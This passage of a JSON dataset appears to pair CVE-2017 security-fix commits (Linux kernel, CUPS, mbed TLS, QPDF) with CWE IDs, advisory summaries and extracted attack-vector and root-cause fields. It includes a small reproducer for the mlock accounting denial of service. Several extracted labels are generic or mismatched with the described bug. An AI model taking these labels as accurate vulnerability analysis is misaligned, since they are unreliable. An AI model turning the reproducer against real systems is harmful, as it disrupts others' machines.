overflow and memory corruption) or possibly have unspecified other impact, as demonstrated by incompatibility between hns_get_sset_count and ethtool_get_strings.","commit_message_1":"hn : fix ethtool_get_strings overflow in hn driver hns_get_sset_count ( ) return hns_net_stats_cnt and the data space allocated is not enough for ethtool_get_strings ( ) , which will cause random memory corruption","Vulnerability Type":"buffer overflow","Attack Vector":"By using a specially-crafted data","Impact":"cause a denial of service ( buffer overflow and memory corruption ) or possibly have unspecified other impact , as demonstrated by incompatibility between hns _ get _ sset _ count and ethtool _ get _ strings .","Root Cause":"does not consider the eth _ ss _ priv _ flags case when retrieving sset _ count data","Attack Type":"local attacker"},{"commit_id":"70feee0e1ef331b22cc51f383d532a0d043fbdcc","cve_id":"CVE-2017-18221","cwe_id":"CWE-20","commit_message":"mlock: fix mlock count can not decrease in race condition\n\nKefeng reported that when running the follow test, the mlock count in\nmeminfo will increase permanently:\n\n [1] testcase\n linux:~ # cat test_mlockal\n grep Mlocked \/proc\/meminfo\n  for j in `seq 0 10`\n  do\n \tfor i in `seq 4 15`\n \tdo\n \t\t.\/p_mlockall >> log &\n \tdone\n \tsleep 0.2\n done\n # wait some time to let mlock counter decrease and 5s may not enough\n sleep 5\n grep Mlocked \/proc\/meminfo\n\n linux:~ # cat p_mlockall.c\n #include <sys\/mman.h>\n #include <stdlib.h>\n #include <stdio.h>\n\n #define SPACE_LEN\t4096\n\n int main(int argc, char ** argv)\n {\n\t \tint ret;\n\t \tvoid *adr = malloc(SPACE_LEN);\n\t \tif (!adr)\n\t \t\treturn -1;\n\n\t \tret = mlockall(MCL_CURRENT | MCL_FUTURE);\n\t \tprintf(\"mlcokall ret = %d\\n\", ret);\n\n\t \tret = munlockall();\n\t \tprintf(\"munlcokall ret = %d\\n\", ret);\n\n\t \tfree(adr);\n\t \treturn 0;\n\t }\n\nIn __munlock_pagevec() we should decrement NR_MLOCK for each page where\nwe clear the PageMlocked flag.  Commit 1ebb7cc6a583 (\"mm: munlock: batch\nNR_MLOCK zone state updates\") has introduced a bug where we don't\ndecrement NR_MLOCK for pages where we clear the flag, but fail to\nisolate them from the lru list (e.g.  when the pages are on some other\ncpu's percpu pagevec).  Since PageMlocked stays cleared, the NR_MLOCK\naccounting gets permanently disrupted by this.\n\nFix it by counting the number of page whose PageMlock flag is cleared.\n\nFixes: 1ebb7cc6a583 (\" mm: munlock: batch NR_MLOCK zone state updates\")\nLink: http:\/\/lkml.kernel.org\/r\/1495678405-54569-1-git-send-email-xieyisheng1@huawei.com\nSigned-off-by: Yisheng Xie <xieyisheng1@huawei.com>\nReported-by: Kefeng Wang <wangkefeng.wang@huawei.com>\nTested-by: Kefeng Wang <wangkefeng.wang@huawei.com>\nCc: Vlastimil Babka <vbabka@suse.cz>\nCc: Joern Engel <joern@logfs.org>\nCc: Mel Gorman <mgorman@suse.de>\nCc: Michel Lespinasse <walken@google.com>\nCc: Hugh Dickins <hughd@google.com>\nCc: Rik van Riel <riel@redhat.com>\nCc: Johannes Weiner <hannes@cmpxchg.org>\nCc: Michal Hocko <mhocko@suse.cz>\nCc: Xishi Qiu <qiuxishi@huawei.com>\nCc: zhongjiang <zhongjiang@huawei.com>\nCc: Hanjun Guo <guohanjun@huawei.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The __munlock_pagevec function in mm\/mlock.c in the Linux kernel before 4.11.4 allows local users to cause a denial of service (NR_MLOCK accounting corruption) via crafted use of mlockall and munlockall system calls.","commit_message_1":"fix mlock count can not decrease in race condition kefeng reported that when running the follow test , the mlock count in meminfo will increase permanently : [ <number> ] testcase linux : ~ # cat test_mlockal grep mlocked \/proc\/meminfo for j in ` seq <number> <number> ` do for i in ` seq <number> <number> ` do","Vulnerability Type":"Improper Input Validation","Attack Vector":"via crafted use of mlockall and munlockall system calls","Impact":"cause a denial of service ( nr _ mlock accounting corruption )","Root Cause":"caused by an NR_MLOCK accounting corruption flaw","Attack Type":"local attacker"},{"commit_id":"27463ad99f738ed93c7c8b3e2e5bc8c4853a2ff2","cve_id":"CVE-2017-18218","cwe_id":"CWE-416","commit_message":"net: hns: Fix a skb used after free bug\n\nskb maybe freed in hns_nic_net_xmit_hw() and return NETDEV_TX_OK,\nwhich cause hns_nic_net_xmit to use a freed skb.\n\nBUG: KASAN: use-after-free in hns_nic_net_xmit_hw+0x62c\/0x940...\n\t[17659.112635]      alloc_debug_processing+0x18c\/0x1a0\n\t[17659.117208]      __slab_alloc+0x52c\/0x560\n\t[17659.120909]      kmem_cache_alloc_node+0xac\/0x2c0\n\t[17659.125309]      __alloc_skb+0x6c\/0x260\n\t[17659.128837]      tcp_send_ack+0x8c\/0x280\n\t[17659.132449]      __tcp_ack_snd_check+0x9c\/0xf0\n\t[17659.136587]      tcp_rcv_established+0x5a4\/0xa70\n\t[17659.140899]      tcp_v4_do_rcv+0x27c\/0x620\n\t[17659.144687]      tcp_prequeue_process+0x108\/0x170\n\t[17659.149085]      tcp_recvmsg+0x940\/0x1020\n\t[17659.152787]      inet_recvmsg+0x124\/0x180\n\t[17659.156488]      sock_recvmsg+0x64\/0x80\n\t[17659.160012]      SyS_recvfrom+0xd8\/0x180\n\t[17659.163626]      __sys_trace_return+0x0\/0x4\n\t[17659.167506] INFO: Freed in kfree_skbmem+0xa0\/0xb0 age=23 cpu=1 pid=13\n\t[17659.174000]      free_debug_processing+0x1d4\/0x2c0\n\t[17659.178486]      __slab_free+0x240\/0x390\n\t[17659.182100]      kmem_cache_free+0x24c\/0x270\n\t[17659.186062]      kfree_skbmem+0xa0\/0xb0\n\t[17659.189587]      __kfree_skb+0x28\/0x40\n\t[17659.193025]      napi_gro_receive+0x168\/0x1c0\n\t[17659.197074]      hns_nic_rx_up_pro+0x58\/0x90\n\t[17659.201038]      hns_nic_rx_poll_one+0x518\/0xbc0\n\t[17659.205352]      hns_nic_common_poll+0x94\/0x140\n\t[17659.209576]      net_rx_action+0x458\/0x5e0\n\t[17659.213363]      __do_softirq+0x1b8\/0x480\n\t[17659.217062]      run_ksoftirqd+0x64\/0x80\n\t[17659.220679]      smpboot_thread_fn+0x224\/0x310\n\t[17659.224821]      kthread+0x150\/0x170\n\t[17659.228084]      ret_from_fork+0x10\/0x40\n\n\tBUG: KASAN: use-after-free in hns_nic_net_xmit+0x8c\/0xc0...\n\t[17751.080490]      __slab_alloc+0x52c\/0x560\n\t[17751.084188]      kmem_cache_alloc+0x244\/0x280\n\t[17751.088238]      __build_skb+0x40\/0x150\n\t[17751.091764]      build_skb+0x28\/0x100\n\t[17751.095115]      __alloc_rx_skb+0x94\/0x150\n\t[17751.098900]      __napi_alloc_skb+0x34\/0x90\n\t[17751.102776]      hns_nic_rx_poll_one+0x180\/0xbc0\n\t[17751.107097]      hns_nic_common_poll+0x94\/0x140\n\t[17751.111333]      net_rx_action+0x458\/0x5e0\n\t[17751.115123]      __do_softirq+0x1b8\/0x480\n\t[17751.118823]      run_ksoftirqd+0x64\/0x80\n\t[17751.122437]      smpboot_thread_fn+0x224\/0x310\n\t[17751.126575]      kthread+0x150\/0x170\n\t[17751.129838]      ret_from_fork+0x10\/0x40\n\t[17751.133454] INFO: Freed in kfree_skbmem+0xa0\/0xb0 age=19 cpu=7 pid=43\n\t[17751.139951]      free_debug_processing+0x1d4\/0x2c0\n\t[17751.144436]      __slab_free+0x240\/0x390\n\t[17751.148051]      kmem_cache_free+0x24c\/0x270\n\t[17751.152014]      kfree_skbmem+0xa0\/0xb0\n\t[17751.155543]      __kfree_skb+0x28\/0x40\n\t[17751.159022]      napi_gro_receive+0x168\/0x1c0\n\t[17751.163074]      hns_nic_rx_up_pro+0x58\/0x90\n\t[17751.167041]      hns_nic_rx_poll_one+0x518\/0xbc0\n\t[17751.171358]      hns_nic_common_poll+0x94\/0x140\n\t[17751.175585]      net_rx_action+0x458\/0x5e0\n\t[17751.179373]      __do_softirq+0x1b8\/0x480\n\t[17751.183076]      run_ksoftirqd+0x64\/0x80\n\t[17751.186691]      smpboot_thread_fn+0x224\/0x310\n\t[17751.190826]      kthread+0x150\/0x170\n\t[17751.194093]      ret_from_fork+0x10\/0x40\n\nFixes: 13ac695e7ea1 (\"net:hns: Add support of Hip06 SoC to the Hislicon Network Subsystem\")\nSigned-off-by: Yunsheng Lin <linyunsheng@huawei.com>\nSigned-off-by: lipeng <lipeng321@huawei.com>\nReported-by: Jun He <hjat2005@huawei.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"In drivers\/net\/ethernet\/hisilicon\/hns\/hns_enet.c in the Linux kernel before 4.13, local users can cause a denial of service (use-after-free and BUG) or possibly have unspecified other impact by leveraging differences in skb handling between hns_nic_net_xmit_hw and hns_nic_net_xmit.","commit_message_1":"hn : fix a skb used after free bug skb maybe freed in hns_nic_net_xmit_hw ( ) and return netdev_tx_ok , which cause hns_nic_net_xmit to use a freed skb","Vulnerability Type":"Use After Free","Attack Vector":"by leveraging differences in skb handling between hns _ nic _ net _ xmit _ hw and hns _ nic _ net _ xmit","Impact":"cause a denial of service","Root Cause":"caused by a use-after-free flaw","Attack Type":"local attacker"},{"commit_id":"853bc26a7ea39e354b9f8889ae7ad1492ffa28d2","cve_id":"CVE-2017-18216","cwe_id":"CWE-476","commit_message":"ocfs2: subsystem.su_mutex is required while accessing the item->ci_parent\n\nThe subsystem.su_mutex is required while accessing the item->ci_parent,\notherwise, NULL pointer dereference to the item->ci_parent will be\ntriggered in the following situation:\n\nadd node                     delete node\nsys_write\n vfs_write\n  configfs_write_file\n   o2nm_node_store\n    o2nm_node_local_write\n                             do_rmdir\n                              vfs_rmdir\n                               configfs_rmdir\n                                mutex_lock(&subsys->su_mutex);\n                                unlink_obj\n                                 item->ci_group = NULL;\n                                 item->ci_parent = NULL;\n\t to_o2nm_cluster_from_node\n\t  node->nd_item.ci_parent->ci_parent\n\t  BUG since of NULL pointer dereference to nd_item.ci_parent\n\nMoreover, the o2nm_cluster also should be protected by the\nsubsystem.su_mutex.\n\n[alex.chen@huawei.com: v2]\n  Link: http:\/\/lkml.kernel.org\/r\/59EEAA69.9080703@huawei.com\nLink: http:\/\/lkml.kernel.org\/r\/59E9B36A.10700@huawei.com\nSigned-off-by: Alex Chen <alex.chen@huawei.com>\nReviewed-by: Jun Piao <piaojun@huawei.com>\nReviewed-by: Joseph Qi <jiangqi903@gmail.com>\nCc: Mark Fasheh <mfasheh@versity.com>\nCc: Joel Becker <jlbec@evilplan.org>\nCc: Junxiao Bi <junxiao.bi@oracle.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"In fs\/ocfs2\/cluster\/nodemanager.c in the Linux kernel before 4.15, local users can cause a denial of service (NULL pointer dereference and BUG) because a required mutex is not used.","commit_message_1":"<file> is required while accessing the item- > ci_parent the <file> is required while accessing the item- > ci_parent , otherwise , null pointer dereference to the item- > ci_parent will be triggered in the following situation : add node delete node sys_write vfs_write configfs_write_file o2nm_node_store o2nm_node_local_write do_rmdir vfs_rmdir configfs_rmdir mutex_lock ( & subsys- > su_mutex ) ; unlink_obj item- > ci_group = null ; item- > ci_parent = null ; to_o2nm_cluster_from_node node- > <file>- > ci_parent bug since of null pointer dereference to <file> moreover , the o2nm_cluster also should be protected by the <file>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference flaw","Attack Type":"local attacker"},{"commit_id":"6ea8d958a2c95a1d514015d4e29ba21a8c0a1a91","cve_id":"CVE-2017-18208","cwe_id":"CWE-835","commit_message":"mm\/madvise.c: fix madvise() infinite loop under special circumstances\n\nMADVISE_WILLNEED has always been a noop for DAX (formerly XIP) mappings.\nUnfortunately madvise_willneed() doesn't communicate this information\nproperly to the generic madvise syscall implementation.  The calling\nconvention is quite subtle there.  madvise_vma() is supposed to either\nreturn an error or update &prev otherwise the main loop will never\nadvance to the next vma and it will keep looping for ever without a way\nto get out of the kernel.\n\nIt seems this has been broken since introduction.  Nobody has noticed\nbecause nobody seems to be using MADVISE_WILLNEED on these DAX mappings.\n\n[mhocko@suse.com: rewrite changelog]\nLink: http:\/\/lkml.kernel.org\/r\/20171127115318.911-1-guoxuenan@huawei.com\nFixes: fe77ba6f4f97 (\"[PATCH] xip: madvice\/fadvice: execute in place\")\nSigned-off-by: chenjie <chenjie6@huawei.com>\nSigned-off-by: guoxuenan <guoxuenan@huawei.com>\nAcked-by: Michal Hocko <mhocko@suse.com>\nCc: Minchan Kim <minchan@kernel.org>\nCc: zhangyi (F) <yi.zhang@huawei.com>\nCc: Miao Xie <miaoxie@huawei.com>\nCc: Mike Rapoport <rppt@linux.vnet.ibm.com>\nCc: Shaohua Li <shli@fb.com>\nCc: Andrea Arcangeli <aarcange@redhat.com>\nCc: Mel Gorman <mgorman@techsingularity.net>\nCc: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>\nCc: David Rientjes <rientjes@google.com>\nCc: Anshuman Khandual <khandual@linux.vnet.ibm.com>\nCc: Rik van Riel <riel@redhat.com>\nCc: Carsten Otte <cotte@de.ibm.com>\nCc: Dan Williams <dan.j.williams@intel.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The madvise_willneed function in mm\/madvise.c in the Linux kernel before 4.14.4 allows local users to cause a denial of service (infinite loop) by triggering use of MADVISE_WILLNEED for a DAX mapping.","commit_message_1":"fix madvise ( ) infinite loop under special circumstance madvise_willneed ha always been a noop for dax ( formerly xip ) mapping","Vulnerability Type":"Infinite Loop","Attack Vector":"by triggering use of madvise _ willneed for a dax mapping .","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"28f5a8a7c033cbf3e32277f4cc9c6afd74f05300","cve_id":"CVE-2017-18204","cwe_id":null,"commit_message":"ocfs2: should wait dio before inode lock in ocfs2_setattr()\n\nwe should wait dio requests to finish before inode lock in\nocfs2_setattr(), otherwise the following deadlock will happen:\n\nprocess 1                  process 2                    process 3\ntruncate file 'A'          end_io of writing file 'A'   receiving the bast messages\nocfs2_setattr\n ocfs2_inode_lock_tracker\n  ocfs2_inode_lock_full\n inode_dio_wait\n  __inode_dio_wait\n  -->waiting for all dio\n  requests finish\n                                                        dlm_proxy_ast_handler\n                                                         dlm_do_local_bast\n                                                          ocfs2_blocking_ast\n                                                           ocfs2_generic_handle_bast\n                                                            set OCFS2_LOCK_BLOCKED flag\n                        dio_end_io\n                         dio_bio_end_aio\n                          dio_complete\n                           ocfs2_dio_end_io\n                            ocfs2_dio_end_io_write\n                             ocfs2_inode_lock\n                              __ocfs2_cluster_lock\n                               ocfs2_wait_for_mask\n                               -->waiting for OCFS2_LOCK_BLOCKED\n                               flag to be cleared, that is waiting\n                               for 'process 1' unlocking the inode lock\n                           inode_dio_end\n                           -->here dec the i_dio_count, but will never\n                           be called, so a deadlock happened.\n\nLink: http:\/\/lkml.kernel.org\/r\/59F81636.70508@huawei.com\nSigned-off-by: Alex Chen <alex.chen@huawei.com>\nReviewed-by: Jun Piao <piaojun@huawei.com>\nReviewed-by: Joseph Qi <jiangqi903@gmail.com>\nAcked-by: Changwei Ge <ge.changwei@h3c.com>\nCc: Mark Fasheh <mfasheh@versity.com>\nCc: Joel Becker <jlbec@evilplan.org>\nCc: Junxiao Bi <junxiao.bi@oracle.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The ocfs2_setattr function in fs\/ocfs2\/file.c in the Linux kernel before 4.14.2 allows local users to cause a denial of service (deadlock) via DIO requests.","commit_message_1":"should wait dio before inode lock in ocfs2_setattr ( ) we should wait dio request to finish before inode lock in ocfs2_setattr ( ) , otherwise the following deadlock will happen : process <number> process <number> process <number> truncate file ' a ' end_io of writing file ' a ' receiving the bast message ocfs2_setattr ocfs2_inode_lock_tracker ocfs2_inode_lock_full inode_dio_wait __inode_dio_wait -- > waiting for all dio request finish dlm_proxy_ast_handler dlm_do_local_bast ocfs2_blocking_ast ocfs2_generic_handle_bast set ocfs2_lock_blocked flag dio_end_io dio_bio_end_aio dio_complete ocfs2_dio_end_io ocfs2_dio_end_io_write ocfs2_inode_lock __ocfs2_cluster_lock ocfs2_wait_for_mask -- > waiting for ocfs2_lock_blocked flag to be cleared , that is waiting for 'process <number> ' unlocking the inode lock inode_dio_end -- > here dec the i_dio_count , but will never be called , so a deadlock happened","Vulnerability Type":"deadlock","Attack Vector":"via dio requests","Impact":"cause a denial of service ( deadlock )","Root Cause":"caused by an issue","Attack Type":"local attacker"},{"commit_id":"b9a41d21dceadf8104812626ef85dc56ee8a60ed","cve_id":"CVE-2017-18203","cwe_id":"CWE-362","commit_message":"dm: fix race between dm_get_from_kobject() and __dm_destroy()\n\nThe following BUG_ON was hit when testing repeat creation and removal of\nDM devices:\n\n    kernel BUG at drivers\/md\/dm.c:2919!\n    CPU: 7 PID: 750 Comm: systemd-udevd Not tainted 4.1.44\n    Call Trace:\n     [<ffffffff81649e8b>] dm_get_from_kobject+0x34\/0x3a\n     [<ffffffff81650ef1>] dm_attr_show+0x2b\/0x5e\n     [<ffffffff817b46d1>] ? mutex_lock+0x26\/0x44\n     [<ffffffff811df7f5>] sysfs_kf_seq_show+0x83\/0xcf\n     [<ffffffff811de257>] kernfs_seq_show+0x23\/0x25\n     [<ffffffff81199118>] seq_read+0x16f\/0x325\n     [<ffffffff811de994>] kernfs_fop_read+0x3a\/0x13f\n     [<ffffffff8117b625>] __vfs_read+0x26\/0x9d\n     [<ffffffff8130eb59>] ? security_file_permission+0x3c\/0x44\n     [<ffffffff8117bdb8>] ? rw_verify_area+0x83\/0xd9\n     [<ffffffff8117be9d>] vfs_read+0x8f\/0xcf\n     [<ffffffff81193e34>] ? __fdget_pos+0x12\/0x41\n     [<ffffffff8117c686>] SyS_read+0x4b\/0x76\n     [<ffffffff817b606e>] system_call_fastpath+0x12\/0x71\n\nThe bug can be easily triggered, if an extra delay (e.g. 10ms) is added\nbetween the test of DMF_FREEING & DMF_DELETING and dm_get() in\ndm_get_from_kobject().\n\nTo fix it, we need to ensure the test of DMF_FREEING & DMF_DELETING and\ndm_get() are done in an atomic way, so _minor_lock is used.\n\nThe other callers of dm_get() have also been checked to be OK: some\ncallers invoke dm_get() under _minor_lock, some callers invoke it under\n_hash_lock, and dm_start_request() invoke it after increasing\nmd->open_count.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Hou Tao <houtao1@huawei.com>\nSigned-off-by: Mike Snitzer <snitzer@redhat.com>","summary":"The dm_get_from_kobject function in drivers\/md\/dm.c in the Linux kernel before 4.14.3 allow local users to cause a denial of service (BUG) by leveraging a race condition with __dm_destroy during creation and removal of DM devices.","commit_message_1":"fix race between dm_get_from_kobject ( ) and __dm_destroy ( ) the following bug_on wa hit when testing repeat creation and removal of dm device : kernel bug at drivers\/md\/<file> : <number> ! cpu : <number> pid : <number> comm : systemd-udevd not tainted <file>","Vulnerability Type":"Race Condition","Attack Vector":"by leveraging a race condition with _ _ dm _ destroy during creation and removal of dm devices","Impact":"cause a denial of service ( bug )","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"687cb0884a714ff484d038e9190edc874edcf146","cve_id":"CVE-2017-18202","cwe_id":"CWE-416","commit_message":"mm, oom_reaper: gather each vma to prevent leaking TLB entry\n\ntlb_gather_mmu(&tlb, mm, 0, -1) means gathering the whole virtual memory\nspace.  In this case, tlb->fullmm is true.  Some archs like arm64\ndoesn't flush TLB when tlb->fullmm is true:\n\n  commit 5a7862e83000 (\"arm64: tlbflush: avoid flushing when fullmm == 1\").\n\nWhich causes leaking of tlb entries.\n\nWill clarifies his patch:\n \"Basically, we tag each address space with an ASID (PCID on x86) which\n  is resident in the TLB. This means we can elide TLB invalidation when\n  pulling down a full mm because we won't ever assign that ASID to\n  another mm without doing TLB invalidation elsewhere (which actually\n  just nukes the whole TLB).\n\n  I think that means that we could potentially not fault on a kernel\n  uaccess, because we could hit in the TLB\"\n\nThere could be a window between complete_signal() sending IPI to other\ncores and all threads sharing this mm are really kicked off from cores.\nIn this window, the oom reaper may calls tlb_flush_mmu_tlbonly() to\nflush TLB then frees pages.  However, due to the above problem, the TLB\nentries are not really flushed on arm64.  Other threads are possible to\naccess these pages through TLB entries.  Moreover, a copy_to_user() can\nalso write to these pages without generating page fault, causes\nuse-after-free bugs.\n\nThis patch gathers each vma instead of gathering full vm space.  In this\ncase tlb->fullmm is not true.  The behavior of oom reaper become similar\nto munmapping before do_exit, which should be safe for all archs.\n\nLink: http:\/\/lkml.kernel.org\/r\/20171107095453.179940-1-wangnan0@huawei.com\nFixes: aac453635549 (\"mm, oom: introduce oom reaper\")\nSigned-off-by: Wang Nan <wangnan0@huawei.com>\nAcked-by: Michal Hocko <mhocko@suse.com>\nAcked-by: David Rientjes <rientjes@google.com>\nCc: Minchan Kim <minchan@kernel.org>\nCc: Will Deacon <will.deacon@arm.com>\nCc: Bob Liu <liubo95@huawei.com>\nCc: Ingo Molnar <mingo@kernel.org>\nCc: Roman Gushchin <guro@fb.com>\nCc: Konstantin Khlebnikov <khlebnikov@yandex-team.ru>\nCc: Andrea Arcangeli <aarcange@redhat.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The __oom_reap_task_mm function in mm\/oom_kill.c in the Linux kernel before 4.14.4 mishandles gather operations, which allows attackers to cause a denial of service (TLB entry leak or use-after-free) or possibly have unspecified other impact by triggering a copy_to_user call within a certain time window.","commit_message_1":"gather each vma to prevent leaking tlb entry tlb_gather_mmu ( & tlb , mm , <number> , -<number> ) mean gathering the whole virtual memory space","Vulnerability Type":"Use After Free","Attack Vector":"by triggering a copy _ to _ user call within a certain time window ","Impact":"cause a denial of service ( tlb entry leak or use - after - free ) or possibly have unspecified other impact","Root Cause":"mishandles gather operations","Attack Type":"attacker"},{"commit_id":"638164a2718f337ea224b747cf5977ef143166a4","cve_id":"CVE-2017-18200","cwe_id":"CWE-20","commit_message":"f2fs: fix potential panic during fstrim\n\nAs Ju Hyung Park reported:\n\n\"When 'fstrim' is called for manual trim, a BUG() can be triggered\nrandomly with this patch.\n\nI'm seeing this issue on both x86 Desktop and arm64 Android phone.\n\nOn x86 Desktop, this was caused during Ubuntu boot-up. I have a\ncronjob installed which calls 'fstrim -v \/' during boot. On arm64\nAndroid, this was caused during GC looping with 1ms gc_min_sleep_time\n& gc_max_sleep_time.\"\n\nRoot cause of this issue is that f2fs_wait_discard_bios can only be\nused by f2fs_put_super, because during put_super there must be no\nother referrers, so it can ignore discard entry's reference count\nwhen removing the entry, otherwise in other caller we will hit bug_on\nin __remove_discard_cmd as there may be other issuer added reference\ncount in discard entry.\n\nThread A\t\t\t\tThread B\n\t\t\t\t\t- issue_discard_thread\n- f2fs_ioc_fitrim\n - f2fs_trim_fs\n  - f2fs_wait_discard_bios\n   - __issue_discard_cmd\n    - __submit_discard_cmd\n\t\t\t\t\t - __wait_discard_cmd\n\t\t\t\t\t  - dc->ref++\n\t\t\t\t\t  - __wait_one_discard_bio\n   - __wait_discard_cmd\n    - __remove_discard_cmd\n     - f2fs_bug_on(sbi, dc->ref)\n\nFixes: 969d1b180d987c2be02de890d0fff0f66a0e80de\nReported-by: Ju Hyung Park <qkrwngud825@gmail.com>\nSigned-off-by: Chao Yu <yuchao0@huawei.com>\nSigned-off-by: Jaegeuk Kim <jaegeuk@kernel.org>","summary":"The f2fs implementation in the Linux kernel before 4.14 mishandles reference counts associated with f2fs_wait_discard_bios calls, which allows local users to cause a denial of service (BUG), as demonstrated by fstrim.","commit_message_1":"fix potential panic during fstrim a ju hyung park reported : `` when 'fstrim ' is called for manual trim , a bug ( ) can be triggered randomly with this patch","Vulnerability Type":"Improper Input Validation","Attack Vector":"as demonstrated by fstrim","Impact":"cause a denial of service ( bug )","Root Cause":"caused by the mishandling of reference counts associated with f2fs_wait_discard_bios calls","Attack Type":"local attacker"},{"commit_id":"dad48e73127ba10279ea33e6dbc8d3905c4d31c0","cve_id":"CVE-2017-18193","cwe_id":"CWE-119","commit_message":"f2fs: fix a bug caused by NULL extent tree\n\nThread A:\t\t\t\t\tThread B:\n\n-f2fs_remount\n    -sbi->mount_opt.opt = 0;\n\t\t\t\t\t\t<--- -f2fs_iget\n\t\t\t\t\t\t         -do_read_inode\n\t\t\t\t\t\t\t     -f2fs_init_extent_tree\n\t\t\t\t\t\t\t         -F2FS_I(inode)->extent_tree is NULL\n        -default_options && parse_options\n\t    -remount return\n\t\t\t\t\t\t<---  -f2fs_map_blocks\n\t\t\t\t\t\t          -f2fs_lookup_extent_tree\n                                                              -f2fs_bug_on(sbi, !et);\n\nThe same problem with f2fs_new_inode.\n\nSigned-off-by: Yunlei He <heyunlei@huawei.com>\nSigned-off-by: Jaegeuk Kim <jaegeuk@kernel.org>","summary":"fs\/f2fs\/extent_cache.c in the Linux kernel before 4.13 mishandles extent trees, which allows local users to cause a denial of service (BUG) via an application with multiple threads.","commit_message_1":"fix a bug caused by null extent tree thread a : thread b : -f2fs_remount -sbi- > <file> = <number> ; < -- - -f2fs_iget -do_read_inode -f2fs_init_extent_tree -f2fs_i ( inode ) - > extent_tree is null -default_options & & parse_options -remount return < -- - -f2fs_map_blocks -f2fs_lookup_extent_tree -f2fs_bug_on ( sbi , ! et ) ; the same problem with f2fs_new_inode","Vulnerability Type":"buffer overflow","Attack Vector":"via an application with multiple threads","Impact":"cause a denial of service ( bug )","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"afa80cb2b457bf8d64f775bed307588610476c41","cve_id":"CVE-2017-18190","cwe_id":"CWE-290","commit_message":"Don't treat \"localhost.localdomain\" as an allowed replacement for localhost, since it isn't.","summary":"A localhost.localdomain whitelist entry in valid_host() in scheduler\/client.c in CUPS before 2.2.2 allows remote attackers to execute arbitrary IPP commands by sending POST requests to the CUPS daemon in conjunction with DNS rebinding. The localhost.localdomain name is often resolved via a DNS server (neither the OS nor the web browser is responsible for ensuring that localhost.localdomain is 127.0.0.1).","commit_message_1":"do n't treat `` <file> '' a an allowed replacement for localhost , since it is n't","Vulnerability Type":"Authentication Bypass by Spoofing","Attack Vector":"by sending POST requests to the CUPS daemon in conjunction with DNS rebinding","Impact":"execute arbitrary ipp","Root Cause":"caused by a localhost.localdomain whitelist entry","Attack Type":"remote attacker"},{"commit_id":"83c9f495ffe70c7dd280b41fdfd4881485a3bc28","cve_id":"CVE-2017-18187","cwe_id":"CWE-190","commit_message":"Prevent bounds check bypass through overflow in PSK identity parsing\n\nThe check `if( *p + n > end )` in `ssl_parse_client_psk_identity` is\nunsafe because `*p + n` might overflow, thus bypassing the check. As\n`n` is a user-specified value up to 65K, this is relevant if the\nlibrary happens to be located in the last 65K of virtual memory.\n\nThis commit replaces the check by a safe version.","summary":"In ARM mbed TLS before 2.7.0, there is a bounds-check bypass through an integer overflow in PSK identity parsing in the ssl_parse_client_psk_identity() function in library\/ssl_srv.c.","commit_message_1":"prevent bound check bypass through overflow in psk identity parsing the check ` if ( * p + n > end ) ` in ` ssl_parse_client_psk_identity ` is unsafe because ` * p + n ` might overflow , thus bypassing the check","Vulnerability Type":"integer overflow","Attack Vector":"By sending a specially-crafted request","Impact":"bypass security restrictions","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"85f05cc57ffa0a863d9d9b23e73acea9410b2937","cve_id":"CVE-2017-18186","cwe_id":"CWE-835","commit_message":"Detect xref pointer infinite loop (fixes #149)","summary":"An issue was discovered in QPDF before 7.0.0. There is an infinite loop due to looping xref tables in QPDF.cc.","commit_message_1":"detect xref pointer infinite loop ( fix # <number> )","Vulnerability Type":"Infinite Loop","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"dea704f0ab7f625e1e7b3f9a1110b45b63157317","cve_id":"CVE-2017-18184","cwe_id":"CWE-125","commit_message":"Pad keys to avoid memory errors (fixes #147)","summary":"An issue was discovered in QPDF before 7.0.0. There is a stack-based out-of-bounds read in the function iterate_rc4 in QPDF_encryption.cc.","commit_message_1":"pad key to avoid memory error ( fix # <number> )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a stack-based out-of-bounds read flaw","Attack Type":"remote attacker"},{"commit_id":"8249a26d69f72b9cda584c14cc3f12769985e481","cve_id":"CVE-2017-18183","cwe_id":"CWE-835","commit_message":"Fix infinite loop in QPDFWriter (fixes #143)","summary":"An issue was discovered in QPDF before 7.0.0. There is an infinite loop in the QPDFWriter::enqueueObject() function in libqpdf\/QPDFWriter.cc.","commit_message_1":"fix infinite loop in qpdfwriter ( fix # <number> )","Vulnerability Type":"Infinite Loop","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"8dca4a41f1ad65043a78c2338d9725f859c8d2c3","cve_id":"CVE-2017-18174","cwe_id":"CWE-415","commit_message":"pinctrl\/amd: Drop pinctrl_unregister for devm_ registered device\n\nIt's not necessary to unregister pin controller device registered\nwith devm_pinctrl_register() and using pinctrl_unregister() leads\nto a double free.\n\nFixes: 3bfd44306c65 (\"pinctrl: amd: Add support for additional GPIO\")\nSigned-off-by: Wei 